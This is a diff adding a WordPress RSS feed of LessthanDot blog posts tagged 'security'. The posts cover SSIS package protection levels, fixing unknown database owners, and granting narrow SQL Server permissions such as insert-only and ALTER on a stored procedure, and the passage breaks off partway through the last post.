@@ -1,0 +1,981 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>security &#8211; LessthanDot</title>
+	<atom:link href="/index.php/tag/security-2/feed/" rel="self" type="application/rss+xml" />
+	<link>/</link>
+	<description>A Technical Community for IT Professionals</description>
+	<lastBuildDate>Sat, 09 Mar 2019 12:50:36 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>hourly</sy:updatePeriod>
+	<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=4.6.1</generator>
+	<item>
+		<title>T-SQL Tuesday #63: How do you manage security</title>
+		<link>/index.php/datamgmt/ssis/t-sql-tuesday-63-how-do-you-manage-security/</link>
+		<comments>/index.php/datamgmt/ssis/t-sql-tuesday-63-how-do-you-manage-security/#comments</comments>
+		<pubDate>Tue, 10 Feb 2015 08:11:04 +0000</pubDate>
+		<dc:creator><![CDATA[Koen Verbeeck]]></dc:creator>
+				<category><![CDATA[SSIS]]></category>
+		<category><![CDATA[security]]></category>
+		<category><![CDATA[ssis]]></category>
+		<category><![CDATA[syndicated]]></category>
+		<category><![CDATA[t-sql tuesday]]></category>
+
+		<guid isPermaLink="false">/?p=3165</guid>
+		<description><![CDATA[This month’s T-SQL Tuesday is hosted by Kenneth Fisher (blog &#124; twitter) and its subject is about security. Security is one of those subjects that most DBAs have to deal with regardless of specialty. So as something we all have to work with at some point or another what are some tips you’d like to [&#8230;]]]></description>
+				<content:encoded><![CDATA[<p style="text-align: justify"><a href="http://sqlstudies.com/2015/02/03/tsql-tuesday-63-how-do-you-manage-security/"><img style="float: left;margin: 0px 10px 0px 10px" src="/wp-content/uploads/2014/01/TSQL2sday.png" alt="TSQL2sday" width="133" height="134" /></a>This month’s T-SQL Tuesday is hosted by Kenneth Fisher (<a href="http://sqlstudies.com/">blog </a>| <a href="https://twitter.com/sqlstudent144">twitter</a>) and its subject is about security.</p>
+<p style="text-align: justify"><em>Security is one of those subjects that most DBAs have to deal with regardless of specialty. So as something we all have to work with at some point or another what are some tips you’d like to share? What’s the best security design? You’ve picked up a legacy system and the security is awful, how do you fix it? Any great tools out there you’d like to share? Hate it or love it I’m betting we all have something to say.</em></p>
+<p style="text-align: justify">Now, I’m not exactly a DBA but even ETL developers have to deal with security from time to time. In this blog post, I’d like to talk about the built-in security of the SSIS packages. You see, SSIS packages can store sensitive data inside them, such as the passwords for the connection managers for example. In order to protect that information, SSIS uses <a href="https://msdn.microsoft.com/en-us/library/ms141747.aspx">protection levels</a> which is a package-level property. These are the available protection levels:</p>
+<ul style="text-align: justify">
+<li><strong>DontSaveSensitive</strong>, which is my personal favorite as it forces you to use either configurations or parameters.</li>
+<li><strong>EncryptSensitiveWithPassword</strong>. Other people can still open the package if they don&#8217;t have the password,  but the passwords in the connection managers are lost and need to be re-entered..</li>
+<li><strong>EncryptAllWithPassword</strong>, for the paranoia people.</li>
+<li><strong>EncryptSensitiveWithUserKey</strong>, which is the default. And as usual, they choose the absolute worst choice as the default. This setting basically means only you can access the sensitive data. Real peachy when you are in a team with multiple developers. Other developers can still open the package (then ignore a few warnings) but they have to re-enter all the passwords in the connection managers.</li>
+<li><strong>EncryptAllWithUserKey</strong>, when you are really possessive over your packages.</li>
+<li><strong>ServerStorage</strong>. When you deploy a package to the server, you trust SQL Server in protecting the sensitive data. This is default when you deploy packages to the SSIS catalog with the project deployment model.</li>
+</ul>
+<p style="text-align: justify">Protection levels were really important before SSIS 2012, as they specified how sensitive data was protected. However, the default of EncryptSensitiveWithUserKey is a really crappy one. If you schedule a package with this protection level using SQL Server Agent, the package can still run if there is no actual sensitive data in the package, but a lot of unnecessary warnings are generated. It&#8217;s best to avoid this protection level at all costs.</p>
+<p style="text-align: justify">Protecting the package with a password is a good option. However, when deploying the package with the package deployment model (or every version of SSIS before 2012), you had to enter the password when you were scheduling the package with Agent. This means though that the password is stored in MSDB, so it isn&#8217;t that secure. My advice is to use DontSaveSensitive and store sensitive information inside a SQL Server configuration table.</p>
+<p style="text-align: justify">With the project deployment model however, configurations are gone. They are replaced with parameters and environments. Since parameters are configured inside the package or project, this means the sensitive data is stored inside the package again. In this case it makes sense to protect the package with a password if needed. There is no issue on the server side, since the protection level is automatically converted to ServerStorage during deployment. Keep in mind that all the packages and the project itself need to have the same protection level, otherwise you get an error when the .ispac file is built.</p>
+<p style="text-align: justify">Conclusion:</p>
+<ul style="text-align: justify">
+<li>when using earlier version of SSIS or when using the package deployment: the DontSaveSensitive protection level in combination with a configuration table is the most secure option.</li>
+<li>when using the project deployment model: use parameters and environments to replace the configurations. Protect the package with a password if you want to secure those parameters.</li>
+</ul>
+<p style="text-align: justify">Note:<br />
+when using Windows Authentication for all sources and destinations, there is almost nothing to be secured in a package. Obviously, this is even more secure.</p>
+]]></content:encoded>
+			<wfw:commentRss>/index.php/datamgmt/ssis/t-sql-tuesday-63-how-do-you-manage-security/feed/</wfw:commentRss>
+		<slash:comments>2</slash:comments>
+		</item>
+		<item>
+		<title>SQL Server Database owner ~~UNKNOWN~~</title>
+		<link>/index.php/datamgmt/dbadmin/sql-server-database-owner-unknown/</link>
+		<comments>/index.php/datamgmt/dbadmin/sql-server-database-owner-unknown/#comments</comments>
+		<pubDate>Tue, 14 May 2013 10:02:00 +0000</pubDate>
+		<dc:creator><![CDATA[SQLDenis]]></dc:creator>
+				<category><![CDATA[Database Administration]]></category>
+		<category><![CDATA[Microsoft SQL Server]]></category>
+		<category><![CDATA[Microsoft SQL Server Admin]]></category>
+		<category><![CDATA[security]]></category>
+		<category><![CDATA[sql server 2000]]></category>
+		<category><![CDATA[sql server 2005]]></category>
+		<category><![CDATA[sql server 2008]]></category>
+		<category><![CDATA[sql server 2012]]></category>
+
+		<guid isPermaLink="false">/index.php/2013/05/sql-server-database-owner-unknown/</guid>
+		<description><![CDATA[Today I was checking an older server and decided to run sp_helpdb. On a bunch of databases I noticed that the owner was ~~UNKNOWN~~. The only reason I noticed this was when I tried to look at a specific database which is mirrored. I was greeted with thi&#8230;]]></description>
+				<content:encoded><![CDATA[<p>Today I was checking an older server and decided to run sp_helpdb. On a bunch of databases I noticed that the owner was ~~UNKNOWN~~. The only reason I noticed this was when I tried to look at a specific database which is mirrored. I was greeted with this dialog box</p>
+<blockquote><p>Cannot show requested dialog.</p>
+<p>Additional information:<br />
+  Cannot show requested dialog.(SqlMgmt)<br />
+    Property Owner is not available for Database'[Your Database Name]&#8217;. This property may not exist for this<br />
+    object, or may not be retrievable due to insufficient access rights. (Microsoft.SqlServer.Smo)</p></blockquote>
+<p>What does this mean, was the server hacked and someone changed the owner? No, what this means is that the owner of the database was a windows account which no longer exists, the person probably left and the account was removed.</p>
+<p>All you have to do is change the owner to a valid login</p>
+<p>If you want it to be sa or a sql login, this example is for sa, change sa to something else if you want a different sql login</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">ALTER</span> <span class="kw1">AUTHORIZATION</span> <span class="kw1">ON</span> <span class="kw1">DATABASE</span>::<span class="br0">&#91;</span>YourDatabase<span class="br0">&#93;</span> <span class="kw1">TO</span> <span class="br0">&#91;</span>sa<span class="br0">&#93;</span>;</pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">ALTER AUTHORIZATION ON DATABASE::[YourDatabase] TO [sa];</pre></div></div>
+
+<p>If you want it to be a windows login, you can do the following</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">ALTER</span> <span class="kw1">AUTHORIZATION</span> <span class="kw1">ON</span> <span class="kw1">DATABASE</span>::<span class="br0">&#91;</span>YourDatabase<span class="br0">&#93;</span> <span class="kw1">TO</span> <span class="br0">&#91;</span>DomainLogin<span class="br0">&#93;</span>;</pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">ALTER AUTHORIZATION ON DATABASE::[YourDatabase] TO [DomainLogin];</pre></div></div>
+
+<p>If you run sp_helpdb now, you will see that the owner has been changed</p>
+<p>If you are old school, you can also use sp_changedbowner to make the change</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+4
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">USE</span> YourDatabase
+GO
+&nbsp;
+<span class="kw1">EXEC</span> <span class="kw3">sp_changedbowner</span> <span class="st0">'sa'</span></pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">USE YourDatabase
+GO
+
+EXEC sp_changedbowner 'sa'</pre></div></div>
+
+]]></content:encoded>
+			<wfw:commentRss>/index.php/datamgmt/dbadmin/sql-server-database-owner-unknown/feed/</wfw:commentRss>
+		<slash:comments>1</slash:comments>
+		</item>
+		<item>
+		<title>Giving only insert permissions to a table for a new login</title>
+		<link>/index.php/datamgmt/dbprogramming/giving-only-insert-permissions-to/</link>
+		<comments>/index.php/datamgmt/dbprogramming/giving-only-insert-permissions-to/#respond</comments>
+		<pubDate>Mon, 04 Mar 2013 13:00:00 +0000</pubDate>
+		<dc:creator><![CDATA[SQLDenis]]></dc:creator>
+				<category><![CDATA[Database Administration]]></category>
+		<category><![CDATA[Database Programming]]></category>
+		<category><![CDATA[Microsoft SQL Server]]></category>
+		<category><![CDATA[Microsoft SQL Server Admin]]></category>
+		<category><![CDATA[security]]></category>
+		<category><![CDATA[sql server 2000]]></category>
+		<category><![CDATA[sql server 2005]]></category>
+		<category><![CDATA[sql server 2008]]></category>
+		<category><![CDATA[sql server 2012]]></category>
+		<category><![CDATA[tables]]></category>
+
+		<guid isPermaLink="false">/index.php/2013/03/giving-only-insert-permissions-to/</guid>
+		<description><![CDATA[There was a requirement to create a new user who would have only insert permissions to one table, this user would also have insert and select permissions to another table.
+
+This is pretty simple to accomplish. First create this simple database with tw&#8230;]]></description>
+				<content:encoded><![CDATA[<p>There was <a href="http://stackoverflow.com/questions/15204118/how-do-i-create-a-user-in-sql-server-that-only-has-access-to-one-table-and-can">a requirement</a> to create a new user who would have only insert permissions to one table, this user would also have insert and select permissions to another table.</p>
+<p>This is pretty simple to accomplish. First create this simple database with two tables</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">CREATE</span> <span class="kw1">DATABASE</span> TestPermission
+GO
+&nbsp;
+<span class="kw1">USE</span> TestPermissions
+GO
+&nbsp;
+&nbsp;
+<span class="kw1">CREATE</span> <span class="kw1">TABLE</span> &nbsp;TestAccess<span class="br0">&#40;</span>id <span class="kw1">INT</span><span class="br0">&#41;</span>
+<span class="kw1">INSERT</span> TestAccess <span class="kw1">VALUES</span> <span class="br0">&#40;</span><span class="nu0">1</span><span class="br0">&#41;</span>
+GO
+&nbsp;
+<span class="kw1">CREATE</span> <span class="kw1">TABLE</span> &nbsp;TestAccess2<span class="br0">&#40;</span>id <span class="kw1">INT</span><span class="br0">&#41;</span>
+<span class="kw1">INSERT</span> TestAccess2 <span class="kw1">VALUES</span> <span class="br0">&#40;</span><span class="nu0">1</span><span class="br0">&#41;</span>
+GO</pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">CREATE DATABASE TestPermission
+GO
+
+USE TestPermissions
+GO
+
+
+CREATE TABLE  TestAccess(id INT)
+INSERT TestAccess VALUES (1)
+GO
+
+CREATE TABLE  TestAccess2(id INT)
+INSERT TestAccess2 VALUES (1)
+GO</pre></div></div>
+
+<p>Create the new user</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">USE</span> <span class="br0">&#91;</span>master<span class="br0">&#93;</span>
+GO
+<span class="kw1">CREATE</span> LOG<span class="sy0">IN</span> <span class="br0">&#91;</span>SomeTestUser<span class="br0">&#93;</span> <span class="kw1">WITH</span> PASSW<span class="sy0">OR</span>D<span class="sy0">=</span>N<span class="st0">'TestPAss'</span>, DEFAULT_DATABASE<span class="sy0">=</span><span class="br0">&#91;</span>master<span class="br0">&#93;</span>, CHECK_EXPIRATION<span class="sy0">=</span><span class="kw1">OFF</span>, CHECK_POLICY<span class="sy0">=</span><span class="kw1">OFF</span>
+GO
+<span class="kw1">USE</span> <span class="br0">&#91;</span>TestPermissions<span class="br0">&#93;</span>
+GO
+<span class="kw1">CREATE</span> <span class="kw1">USER</span> <span class="br0">&#91;</span>SomeTestUser<span class="br0">&#93;</span> <span class="kw1">FOR</span> LOG<span class="sy0">IN</span> <span class="br0">&#91;</span>SomeTestUser<span class="br0">&#93;</span>
+GO</pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">USE [master]
+GO
+CREATE LOGIN [SomeTestUser] WITH PASSWORD=N'TestPAss', DEFAULT_DATABASE=[master], CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF
+GO
+USE [TestPermissions]
+GO
+CREATE USER [SomeTestUser] FOR LOGIN [SomeTestUser]
+GO</pre></div></div>
+
+<p>Now just give the user insert permissions to the TestAccess  table</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+4
+5
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">USE</span> TestPermissions
+GO
+&nbsp;
+&nbsp;
+<span class="kw1">GRANT</span> <span class="kw1">INSERT</span> <span class="kw1">ON</span> TestAccess <span class="kw1">TO</span> SomeTestUser</pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">USE TestPermissions
+GO
+
+
+GRANT INSERT ON TestAccess TO SomeTestUser</pre></div></div>
+
+<p>Login as the newly created user and try to run the following</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">SELECT</span> <span class="sy0">*</span> <span class="kw1">FROM</span> TestAccess</pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">SELECT * FROM TestAccess</pre></div></div>
+
+<p>Here is the error message that you will get</p>
+<p><em>Msg 229, Level 14, State 5, Line 1<br />
+The SELECT permission was denied on the object &#8216;TestAccess&#8217;, database &#8216;TestPermissions&#8217;, schema &#8216;dbo&#8217;.</em></p>
+<p>Running the insert statement is no problem</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">INSERT</span> TestAccess <span class="kw1">VALUES</span> <span class="br0">&#40;</span><span class="nu0">1</span><span class="br0">&#41;</span></pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">INSERT TestAccess VALUES (1)</pre></div></div>
+
+<p>Go back to the admin connection and run the following</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">GRANT</span> <span class="kw1">SELECT</span>,<span class="kw1">INSERT</span> <span class="kw1">ON</span> TestAccess2 <span class="kw1">TO</span> SomeTestUser</pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">GRANT SELECT,INSERT ON TestAccess2 TO SomeTestUser</pre></div></div>
+
+<p>As you can see you can combine privileges with the GRANT statement, you don&#8217;t have to do the separately</p>
+<p>You just gave insert and select permissions to SomeTestUser for the TestAccess2  table</p>
+<p>Now if you go back to the connection, you can run the following without a problem</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">INSERT</span> TestAccess2 <span class="kw1">VALUES</span> <span class="br0">&#40;</span><span class="nu0">1</span><span class="br0">&#41;</span>
+<span class="kw1">SELECT</span> <span class="sy0">*</span> <span class="kw1">FROM</span> TestAccess2</pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">INSERT TestAccess2 VALUES (1)
+SELECT * FROM TestAccess2</pre></div></div>
+
+<p>In general you probably want a user to have read permissions or write permissions for all the tables, in that case you can use a role. The following will give read and write permissions for all the tables in the database</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+4
+5
+6
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">USE</span> <span class="br0">&#91;</span>TestPermissions<span class="br0">&#93;</span>
+GO
+<span class="kw1">EXEC</span> <span class="kw3">sp_addrolemember</span> N<span class="st0">'db_datareader'</span>, N<span class="st0">'SomeTestUser'</span>
+GO
+<span class="kw1">EXEC</span> <span class="kw3">sp_addrolemember</span> N<span class="st0">'db_datawriter'</span>, N<span class="st0">'SomeTestUser'</span>
+GO</pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">USE [TestPermissions]
+GO
+EXEC sp_addrolemember N'db_datareader', N'SomeTestUser'
+GO
+EXEC sp_addrolemember N'db_datawriter', N'SomeTestUser'
+GO</pre></div></div>
+
+]]></content:encoded>
+			<wfw:commentRss>/index.php/datamgmt/dbprogramming/giving-only-insert-permissions-to/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Giving users the ability to change a stored procedure without making them db_owner</title>
+		<link>/index.php/datamgmt/dbadmin/mssqlserveradmin/giving-users-the-ability-to/</link>
+		<comments>/index.php/datamgmt/dbadmin/mssqlserveradmin/giving-users-the-ability-to/#comments</comments>
+		<pubDate>Tue, 08 Jan 2013 15:07:00 +0000</pubDate>
+		<dc:creator><![CDATA[SQLDenis]]></dc:creator>
+				<category><![CDATA[Microsoft SQL Server]]></category>
+		<category><![CDATA[Microsoft SQL Server Admin]]></category>
+		<category><![CDATA[dcl]]></category>
+		<category><![CDATA[permissions]]></category>
+		<category><![CDATA[security]]></category>
+		<category><![CDATA[sql server 2008]]></category>
+		<category><![CDATA[sql server 2012]]></category>
+		<category><![CDATA[stored procedures]]></category>
+
+		<guid isPermaLink="false">/index.php/2013/01/giving-users-the-ability-to/</guid>
+		<description><![CDATA[I once did some work for a company and noticed that they were running as sysadmin. When I asked why, their answer was that the stored procedures would not work otherwise. This is very bad practice, in general I create a user, and then give execute permi&#8230;]]></description>
+				<content:encoded><![CDATA[<p>I once did some work for a company and noticed that they were running as sysadmin. When I asked why, their answer was that the stored procedures would not work otherwise. This is very bad practice, in general I create a user, and then give execute permissions to the procedures. In some instances the user might also get reader and writer permissions.</p>
+<p>Yesterday I got a request from a person who wanted to be able to change two stored procedures on the staging server. There is no need to make this person a db_owner, you can just give the ALTER proc permissions. There are two flavors of the syntax</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">GRANT</span> <span class="kw1">ALTER</span> &nbsp;<span class="kw1">ON</span> <span class="kw1">OBJECT</span>::ProcName <span class="kw1">TO</span> UserName
+<span class="kw1">GRANT</span> <span class="kw1">ALTER</span> &nbsp;<span class="kw1">ON</span> &nbsp;ProcName <span class="kw1">TO</span> UserName</pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">GRANT ALTER  ON OBJECT::ProcName TO UserName
+GRANT ALTER  ON  ProcName TO UserName</pre></div></div>
+
+<p>Let&#8217;s take a look at this by writing some code. First create a new database</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">CREATE</span> <span class="kw1">DATABASE</span> Test
+GO</pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">CREATE DATABASE Test
+GO</pre></div></div>
+
+<p>Create a user in that database</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">USE</span> <span class="br0">&#91;</span>master<span class="br0">&#93;</span>
+GO
+<span class="kw1">CREATE</span> LOG<span class="sy0">IN</span> <span class="br0">&#91;</span>TestUser<span class="br0">&#93;</span> <span class="kw1">WITH</span> PASSW<span class="sy0">OR</span>D<span class="sy0">=</span>N<span class="st0">'Test'</span>, DEFAULT_DATABASE<span class="sy0">=</span><span class="br0">&#91;</span>test<span class="br0">&#93;</span>, CHECK_EXPIRATION<span class="sy0">=</span><span class="kw1">OFF</span>, CHECK_POLICY<span class="sy0">=</span><span class="kw1">OFF</span>
+GO
+<span class="kw1">USE</span> <span class="br0">&#91;</span>test<span class="br0">&#93;</span>
+GO
+<span class="kw1">CREATE</span> <span class="kw1">USER</span> <span class="br0">&#91;</span>TestUser<span class="br0">&#93;</span> <span class="kw1">FOR</span> LOG<span class="sy0">IN</span> <span class="br0">&#91;</span>TestUser<span class="br0">&#93;</span>
+GO</pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">USE [master]
+GO
+CREATE LOGIN [TestUser] WITH PASSWORD=N'Test', DEFAULT_DATABASE=[test], CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF
+GO
+USE [test]
+GO
+CREATE USER [TestUser] FOR LOGIN [TestUser]
+GO</pre></div></div>
+
+<p>Now create this very simple stored procedure</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">CREATE</span> <span class="kw1">PROC</span> prTest
+<span class="kw1">AS</span>
+<span class="kw1">SELECT</span> <span class="kw2">GETDATE</span><span class="br0">&#40;</span><span class="br0">&#41;</span></pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">CREATE PROC prTest
+AS
+SELECT GETDATE()</pre></div></div>
+
+<p>Open up another connection, login as TestUser with the password Test. If you try to execuce the stored procedure you will get an error</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">EXEC</span> prTest</pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">EXEC prTest</pre></div></div>
+
+<p>Msg 229, Level 14, State 5, Procedure prTest, Line 1<br />
+The EXECUTE permission was denied on the object &#8216;prTest&#8217;, database &#8216;test&#8217;, schema &#8216;dbo&#8217;.</p>
+<p>In the window where you have all the permissions, give execute permissions to this stored procedure to the TestUser. You can use GRANT EXECUTE  ON ProcName TO UserName to accomplish this, there is no need to give additional privileges like db_owner or sysadmin</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">GRANT</span> <span class="kw1">EXECUTE</span> &nbsp;<span class="kw1">ON</span> prTest &nbsp;<span class="kw1">TO</span> TestUser</pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">GRANT EXECUTE  ON prTest  TO TestUser</pre></div></div>
+
+<p>Now you will see that TestUser can execute the stored procedure.</p>
+<p>If TestUser wants to modify the stored procedure you can give TestUser  ALTER StoredProc permissions. First let&#8217;s see what happens if TestUser tries to modify the stored procedure before we gave the permissions</p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+3
+</pre></td><td class="de1"><pre class="de1"><span class="kw1">ALTER</span> <span class="kw1">PROC</span> prTest
+<span class="kw1">AS</span>
+<span class="kw1">SELECT</span> <span class="kw2">GETDATE</span><span class="br0">&#40;</span><span class="br0">&#41;</span></pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">ALTER PROC prTest
+AS
+SELECT GETDATE()</pre></div></div>
+
+<p>And here is the error</p>
